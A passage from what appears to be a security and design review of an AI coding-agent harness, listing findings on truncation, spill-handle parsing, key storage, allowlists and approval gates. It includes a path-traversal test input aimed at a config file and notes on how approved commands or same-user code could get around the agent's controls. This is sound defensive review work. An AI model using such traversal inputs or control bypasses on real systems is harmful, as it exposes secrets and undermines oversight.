**M14. Output cap vs edit size.** `max_out_cap 4096` with whole-function REPLACE blocks gives `finish_reason=length`, a truncated block, a matcher failure and wasted turns. Fix: on `length`, ask once for a continuation in the same turn (charged under a new reservation) or instruct ≤ 60-line blocks. Count truncations in the waste table.

**M15. Spill handles and `read("out:N")`.** Parse `N` as int only; scope it to the session dir; label spills with the session label (already stated). Test: `read("out:../../config.yaml")` → DENY.

**M16. Baseline time-box defeats the regression check.** When the 120 s baseline times out, "fall back to affected tests + oracle" means regressions elsewhere are not caught, but the result is still reported as SOLVED. Fix: the receipt says "SOLVED (partial suite)", and the bench treats it as unverified unless the hidden run passes.

---

## Low

- **L1.** `principal = sha256(VK)[:16]`: fine, but VKs in plain `config.yaml` are readable by same-user code (C2). Use DPAPI at rest.
- **L2.** The journal hash chain is tamper-*evident* only against accidents; same-user code can recompute it. The wording should say "hash-chained", not "tamper-proof".
- **L3.** `tree-sitter` parsing hostile files: cap file size (1 MB) and parse time (`parser.timeout_micros`), and skip binaries. Low risk, cheap fix.
- **L4.** Tavily spend is outside the money ledger. Add a per-call cost row (credits → $) for completeness.
- **L5.** The breaker's HALF-OPEN probe (`max_tokens=1`) must reserve (H7 #6) and be journaled.
- **L6.** The OpenAI `TBD` prices make every cheap/strong reserve fail (the chain ceiling includes openai), so the ladder drops to local on D1. Doctor must fail loudly on TBD.
- **L7.** `crocodile` should be unrunnable from `run_cmd` (it is not in any list), so that `init --public` cannot be invoked through an approved command. The no-console check probably saves it, but be explicit.
- **L8.** Polyglot "seeds" on Anthropic are not real seeds. Say "2 independent runs at temperature T".

---

## Internal contradictions found

1. §5.5 "run_tests always approval" vs §5.10 B/C and §5.2 running tests and collection automatically (C1).
2. §2.1 "Bifrost local" vs §4.2 "cross-machine backstop" vs R2 per-user limits (H8).
3. `doctor` reads admin-only governance config vs "admin creds never in the agent's process" (H9).
4. "Pessimistic: everything a cache write" vs `tier_over_100k` prices higher than cache write (H7).
5. §10.2 "≈ 360 runs" vs ablation rule math (H13).
6. `must_keep ⊆ shown` vs `max_bytes 10240` (M8).
7. Edits are "approved" but the ladder writes ruff fixes (H12).
8. "Overshoot $0.0000" vs p95 calibration and TTL expiry (H7).

## Over-engineering for a 10–15 Nov build (already 12 Nov)

Cut or defer, in addition to the §10.3 list: PowerShell tree-sitter explainer (keep "unparsed ⚠"); quote calibration from traces; `experience` TF-IDF and hopeless stop; cache-break blame; canary injection into source files (keep the `.crocodile/canary` + one file); three-column race demo (keep ours vs naive; measure Bifrost-only if time allows); `pytest-testmon`. Spend the saved time on C1–C3, H1, H5, H7 (`reservation_id` required in egress) and H11, which are each < 2 h and close the largest holes.

Sources for the external fact in C3: [Ollama cloud docs](https://docs.ollama.com/cloud), [DeepWiki: Ollama cloud models](https://deepwiki.com/ollama/ollama/4.7-cloud-models), [Ollama FAQ mirror (disable cloud)](https://git.minecraftlegacy.com/ihateninjas/ollama/src/branch/main/docs/faq.mdx).
